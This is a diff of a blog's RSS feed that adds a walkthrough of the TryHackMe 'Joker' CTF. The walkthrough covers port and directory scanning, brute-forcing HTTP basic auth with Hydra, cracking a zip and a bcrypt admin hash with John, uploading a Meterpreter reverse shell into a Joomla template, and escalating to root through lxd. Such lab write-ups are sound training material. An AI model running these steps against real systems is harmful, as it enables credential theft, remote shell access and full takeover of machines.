@@ -1,4 +1,188 @@
-<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:media="http://search.yahoo.com/mrss/" version="2.0"><channel><title>fr33s0ul</title><description>Cybersecurity, Technology, and CTFs</description><link>http://localhost:2368/</link><image><url>http://localhost:2368/favicon.png</url><title>fr33s0ul</title><link>http://localhost:2368/</link></image><generator>Ghost 3.12</generator><lastBuildDate>Sat, 04 Apr 2020 11:32:20 GMT</lastBuildDate><atom:link href="http://localhost:2368/rss/" rel="self" type="application/rss+xml"/><ttl>60</ttl><item><title>ToolsRus CTF | write-up</title><description>&lt;p&gt;Hello all, todays challenge is made by Tryhackme.com, it's a fun CTF ratted as easy, totally straight forward.&lt;/p&gt;&lt;p&gt;Let's enumerate the machine&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -sC -sV 10.10.27.83
+<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:media="http://search.yahoo.com/mrss/" version="2.0"><channel><title>fr33s0ul</title><description>Cybersecurity, Technology, and CTFs</description><link>http://localhost:2368/</link><image><url>http://localhost:2368/favicon.png</url><title>fr33s0ul</title><link>http://localhost:2368/</link></image><generator>Ghost 3.12</generator><lastBuildDate>Tue, 07 Apr 2020 21:10:32 GMT</lastBuildDate><atom:link href="http://localhost:2368/rss/" rel="self" type="application/rss+xml"/><ttl>60</ttl><item><title>JockerCTF | write-up</title><description>&lt;p&gt;Hello world, I hope you are all well and safe home from the epidemic, today's challenge is a CTF by Tryhackme is rated medium, but still it needs focus and trying the right techniques, or you'll just dive in a rabbit hole.&lt;/p&gt;&lt;p&gt;Let's get started with some enumeration ...&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:&lt;/code&gt;&lt;/pre&gt;</description><link>http://localhost:2368/jockerctf-write-up/</link><guid isPermaLink="false">5e8caabb75832c27370ae6e1</guid><dc:creator>fr33s0ul</dc:creator><pubDate>Tue, 07 Apr 2020 16:31:26 GMT</pubDate><media:content url="http://localhost:2368/content/images/2020/04/joker.jpg" medium="image"/><content:encoded>&lt;img src="http://localhost:2368/content/images/2020/04/joker.jpg" alt="JockerCTF | write-up"&gt;&lt;p&gt;Hello world, I hope you are all well and safe home from the epidemic, today's challenge is a CTF by Tryhackme is rated medium, but still it needs focus and trying the right techniques, or you'll just dive in a rabbit hole.&lt;/p&gt;&lt;p&gt;Let's get started with some enumeration ...&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -sV -sC 10.10.215.43 
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-07 16:30 UTC
+Nmap scan report for ip-10-10-215-43.eu-west-1.compute.internal (10.10.215.43)
+Host is up (0.0010s latency).
+Not shown: 997 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 ad:20:1f:f4:33:1b:00:70:b3:85:cb:87:00:c4:f4:f7 (RSA)
+|   256 1b:f9:a8:ec:fd:35:ec:fb:04:d5:ee:2a:a1:7a:4f:78 (ECDSA)
+|_  256 dc:d7:dd:6e:f6:71:1f:8c:2c:2c:a1:34:6d:29:99:20 (ED25519)
+80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: HA: Joker
+8080/tcp open  http    Apache httpd 2.4.29
+| http-auth: 
+| HTTP/1.1 401 Unauthorized\x0D
+|_  Basic realm=Please enter the password.
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: 401 Unauthorized
+MAC Address: 02:9E:D8:EE:E7:2C (Unknown)
+Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.18 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-07-at-17.31.50.png" class="kg-image" alt="JockerCTF | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-07-at-17.32.05.png" class="kg-image" alt="JockerCTF | write-up"&gt;&lt;/figure&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/12qASHliHqDPSo" width="328" height="480" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/joker-12qASHliHqDPSo"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;p&gt;well well well, we have three ports &lt;strong&gt;ssh&lt;/strong&gt; on 22 and some &lt;strong&gt;apache&lt;/strong&gt; on 80 and 8080, It seems that we need credentials to access something in port 8080.&lt;/p&gt;&lt;p&gt;we'll dig more in port 80 and see if we have any interesting directories and files.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# dirb http://10.10.215.43/
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Tue Apr  7 16:37:56 2020
+URL_BASE: http://10.10.215.43/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://10.10.215.43/ ----
+==&amp;gt; DIRECTORY: http://10.10.215.43/css/                                            
+==&amp;gt; DIRECTORY: http://10.10.215.43/img/                                            
++ http://10.10.215.43/index.html (CODE:200|SIZE:5954)                              
++ http://10.10.215.43/phpinfo.php (CODE:200|SIZE:94848)                            
++ http://10.10.215.43/server-status (CODE:403|SIZE:277)  &lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code class="language-markup"&gt;root@kali:~# dirb http://10.10.215.43/ -X .txt
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Tue Apr  7 16:38:47 2020
+URL_BASE: http://10.10.215.43/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+EXTENSIONS_LIST: (.txt) | (.txt) [NUM = 1]
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://10.10.215.43/ ----
++ http://10.10.215.43/secret.txt (CODE:200|SIZE:320)                               
+                                                                                   
+-----------------
+END_TIME: Tue Apr  7 16:38:49 2020
+DOWNLOADED: 4612 - FOUND: 1
+root@kali:~# &lt;/code&gt;&lt;/pre&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-07-at-17.40.16.png" class="kg-image" alt="JockerCTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;And we have a secret conversation between Batman and the Joker, checking other directories and backend php file info doesn't give us anything for now ...&lt;/p&gt;&lt;p&gt;our next shot, some bruteforcing in port 8080 and using Batman or Joker as a username and see what we get.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-07-at-19.30.39.png" class="kg-image" alt="JockerCTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;Xhydra is the GUI version of hydra, both of them work fine. But I choose the GUI version because it was faster and less troubleshooting for my machine.&lt;/p&gt;&lt;p&gt;the password used by Joker is h****h, with dirbuster or dirb or gobuster we can't look for directories so we will use nikto with the credentials, and see if we can do anything with them 🙃&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nikto -h http://10.10.215.43:8080/ -id joker:h****h
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.10.215.43
++ Target Hostname:    10.10.215.43
++ Target Port:        8080
++ Start Time:         2020-04-07 18:31:07 (GMT0)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.29 (Ubuntu)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ / - Requires Authentication for realm ' Please enter the password.'
++ Successfully authenticated to realm ' Please enter the password.' with user-supplied credentials.
++ Entry '/administrator/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ Entry '/bin/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ Entry '/cache/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ Entry '/cli/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ Entry '/components/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ Entry '/includes/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ Entry '/language/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ Entry '/layouts/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ Entry '/libraries/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ Entry '/modules/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ Entry '/plugins/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ Entry '/tmp/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ "robots.txt" contains 14 entries which should be manually viewed.
++ /backup.zip: Potentially interesting archive/cert file found.
++ /backup.zip: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
++ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
++ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
++ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
++ Uncommon header 'tcn' found, with contents: choice
++ OSVDB-3092: /web.config: ASP config file is accessible.
++ OSVDB-8193: /index.php?module=ew_filemanager&amp;amp;type=admin&amp;amp;func=manager&amp;amp;pathext=../../../etc: EW FileManager for PostNuke allows arbitrary file retrieval.
++ OSVDB-3092: /administrator/: This might be interesting...
++ OSVDB-3092: /bin/: This might be interesting...
++ OSVDB-3092: /includes/: This might be interesting...
++ OSVDB-3092: /tmp/: This might be interesting...
++ OSVDB-3092: /README: README file found.
++ OSVDB-3092: /LICENSE.txt: License file found may identify site software.
++ OSVDB-3233: /icons/README: Apache default file found.
++ /htaccess.txt: Default Joomla! htaccess.txt file found. This should be removed or renamed.
++ /administrator/index.php: Admin login page/section found.
++ 8719 requests: 0 error(s) and 34 item(s) reported on remote host
++ End Time:           2020-04-07 18:31:43 (GMT0) (36 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+root@kali:~# 
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;we gathered a lot of useful information, the first thing that got my attention was the &lt;strong&gt;backup.zip&lt;/strong&gt; file and the &lt;strong&gt;/administrator&lt;/strong&gt; directory.&lt;/p&gt;&lt;p&gt;After downloading the backup.zip file it was encrypted, but not for so long ...&lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/26xBN6I5tVKveX2wg" width="480" height="256" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/johnwick2-lionsgate-john-wick-26xBN6I5tVKveX2wg"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;pre&gt;&lt;code&gt;root@kali:~/Downloads# zip2john backup.zip &amp;gt; hash
+root@kali:~/Downloads# john hash --wordlist=/usr/share/wordlists/rockyou.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+h****h           (backup.zip)
+1g 0:00:00:00 DONE (2020-04-07 18:34) 100.0g/s 409600p/s 409600c/s 409600C/s 123456..oooooo
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Thank you Joker for using the same passwords 😶, after decompressing the backup we found a database and a backup of the whole site. &lt;/p&gt;&lt;p&gt;the database contained the credentials to access the running site and that's what we did, our next step will be getting a reverse shell, obviously after we decrypt the admin password... obviously 🙄 &lt;/p&gt;&lt;pre&gt;&lt;code&gt;INSERT INTO `cc1gr_users` VALUES (547,'Super Duper User','admin','admin@example.com','$2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG',0,1,'2019-10-08 12:00:15',&lt;/code&gt;&lt;/pre&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-07-at-19.45.31.png" class="kg-image" alt="JockerCTF | write-up"&gt;&lt;/figure&gt;&lt;pre&gt;&lt;code&gt;" target="_blankroot@kali:~# john hash --wordlist=/usr/share/wordlists/rockyou.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 1024 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+a******4         (?)
+1g 0:00:00:14 DONE (2020-04-07 18:48) 0.06997g/s 71.79p/s 71.79c/s 71.79C/s bullshit..bulldogs
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+root@kali:~# 
+&lt;/code&gt;&lt;/pre&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-07-at-19.50.16.png" class="kg-image" alt="JockerCTF | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-07-at-19.50.50.png" class="kg-image" alt="JockerCTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;go to extension, and upload your reverse shell. I created mine with msfvenom the payload &lt;strong&gt;php/meterpreter/reverse_tcp&lt;/strong&gt; exported it as raw php and uploaded it in the error.php file and previewed it from the site and it called back to us.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# msfconsole
+[-] ***rting the Metasploit Framework console.../
+[-] * WARNING: No database support: No database YAML file
+[-] ***
+                                                  
+     ,           ,
+    /             \
+   ((__---,,,---__))
+      (_) O O (_)_________
+         \ _ /            |\
+          o_o \   M S F   | \
+               \   _____  |  *
+                |||   WW|||
+                |||     |||
+
+
+       =[ metasploit v5.0.71-dev                          ]
++ -- --=[ 1962 exploits - 1095 auxiliary - 336 post       ]
++ -- --=[ 558 payloads - 45 encoders - 10 nops            ]
++ -- --=[ 7 evasion                                       ]
+
+msf5 &amp;gt; use exploit/multi/handler
+msf5 exploit(multi/handler) &amp;gt; set payload php/meterpreter/reverse_tcp
+payload =&amp;gt; php/meterpreter/reverse_tcp                                              
+msf5 exploit(multi/handler) &amp;gt; set lhost 10.10.188.92                                
+lhost =&amp;gt; 10.10.188.92                                                               
+msf5 exploit(multi/handler) &amp;gt; set lport 7878                                        
+lport =&amp;gt; 7878                                                                       
+msf5 exploit(multi/handler) &amp;gt; run                                                   
+                                                                                    
+[*] Started reverse TCP handler on 10.10.188.92:7878                                
+[*] Sending stage (38288 bytes) to 10.10.215.43                                     
+[*] Meterpreter session 1 opened (10.10.188.92:7878 -&amp;gt; 10.10.215.43:34370) at 2020-04-07 19:00:43 +0000                                                                 
+                                                                                    
+meterpreter &amp;gt; getuid
+Server username: www-data (33)                                                      
+meterpreter &amp;gt;                          &lt;/code&gt;&lt;/pre&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/UoYA5jnXE5V7u4MJh7" width="480" height="480" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/joker-the-dark-knight-washing-hands-UoYA5jnXE5V7u4MJh7"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-07-at-20.06.11.png" class="kg-image" alt="JockerCTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;if we look closer we are part of a group called lxd, for me i just learned what is lxd (linux containers) and how do they work ... I would suggest reading the article that I'll leave at the end, so you can learn more about lxd and the privilege escalation that can be done.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-07-at-20.07.56.png" class="kg-image" alt="JockerCTF | write-up"&gt;&lt;/figure&gt;&lt;pre&gt;&lt;code class="language-markup"&gt;$ lxc init myalpine joker -c security.privileged=true
+Creating Joker
+$ lxc config device add joker mydevice disk source=/ path=/mnt/root recursive=true
+$ lxc start joker
+$ lxc exec ignite /bin/sh
+whoami
+root&lt;/code&gt;&lt;/pre&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/p8EJ11ZuJlIxG" width="480" height="270" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/reaction-p8EJ11ZuJlIxG"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;p&gt;That's it for today, stay safe, and HAPPY HACKING!&lt;/p&gt;&lt;figure class="kg-card kg-embed-card"&gt;&lt;blockquote class="wp-embedded-content"&gt;&lt;a href="https://www.hackingarticles.in/lxd-privilege-escalation/"&gt;Lxd Privilege Escalation&lt;/a&gt;&lt;/blockquote&gt;
+&lt;script type="text/javascript"&gt;
+&lt;!--//--&gt;&lt;![CDATA[//&gt;&lt;!--
+		/*! This file is auto-generated */
+		!function(d,l){"use strict";var e=!1,o=!1;if(l.querySelector)if(d.addEventListener)e=!0;if(d.wp=d.wp||{},!d.wp.receiveEmbedMessage)if(d.wp.receiveEmbedMessage=function(e){var t=e.data;if(t)if(t.secret||t.message||t.value)if(!/[^a-zA-Z0-9]/.test(t.secret)){var r,a,i,s,n,o=l.querySelectorAll('iframe[data-secret="'+t.secret+'"]'),c=l.querySelectorAll('blockquote[data-secret="'+t.secret+'"]');for(r=0;r&lt;c.length;r++)c[r].style.display="none";for(r=0;r&lt;o.length;r++)if(a=o[r],e.source===a.contentWindow){if(a.removeAttribute("style"),"height"===t.message){if(1e3&lt;(i=parseInt(t.value,10)))i=1e3;else if(~~i&lt;200)i=200;a.height=i}if("link"===t.message)if(s=l.createElement("a"),n=l.createElement("a"),s.href=a.getAttribute("src"),n.href=t.value,n.host===s.host)if(l.activeElement===a)d.top.location.href=t.value}}},e)d.addEventListener("message",d.wp.receiveEmbedMessage,!1),l.addEventListener("DOMContentLoaded",t,!1),d.addEventListener("load",t,!1);function t(){if(!o){o=!0;var e,t,r,a,i=-1!==navigator.appVersion.indexOf("MSIE 10"),s=!!navigator.userAgent.match(/Trident.*rv:11\./),n=l.querySelectorAll("iframe.wp-embedded-content");for(t=0;t&lt;n.length;t++){if(!(r=n[t]).getAttribute("data-secret"))a=Math.random().toString(36).substr(2,10),r.src+="#?secret="+a,r.setAttribute("data-secret",a);if(i||s)(e=r.cloneNode(!0)).removeAttribute("security"),r.parentNode.replaceChild(e,r)}}}}(window,document);
+//--&gt;&lt;!]]&gt;
+&lt;/script&gt;&lt;iframe sandbox="allow-scripts" security="restricted" src="https://www.hackingarticles.in/lxd-privilege-escalation/embed/" width="600" height="338" title="&amp;#8220;Lxd Privilege Escalation&amp;#8221; &amp;#8212; Hacking Articles" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" class="wp-embedded-content"&gt;&lt;/iframe&gt;&lt;/figure&gt;</content:encoded></item><item><title>ToolsRus CTF | write-up</title><description>&lt;p&gt;Hello all, todays challenge is made by Tryhackme.com, it's a fun CTF ratted as easy, totally straight forward.&lt;/p&gt;&lt;p&gt;Let's enumerate the machine&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -sC -sV 10.10.27.83
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-03 13:36 UTC
 Nmap scan report for ip-10-10-27-83.eu-west-1.&lt;/code&gt;&lt;/pre&gt;</description><link>http://localhost:2368/toolsrus-ctf-write-up/</link><guid isPermaLink="false">5e873c54c0200b446da05df8</guid><dc:creator>fr33s0ul</dc:creator><pubDate>Fri, 03 Apr 2020 13:44:52 GMT</pubDate><media:content url="http://localhost:2368/content/images/2020/04/77fd9d1804d33b5cf3adf1a2f3dcc34b-1.jpg" medium="image"/><content:encoded>&lt;img src="http://localhost:2368/content/images/2020/04/77fd9d1804d33b5cf3adf1a2f3dcc34b-1.jpg" alt="ToolsRus CTF | write-up"&gt;&lt;p&gt;Hello all, todays challenge is made by Tryhackme.com, it's a fun CTF ratted as easy, totally straight forward.&lt;/p&gt;&lt;p&gt;Let's enumerate the machine&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -sC -sV 10.10.27.83
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-03 13:36 UTC
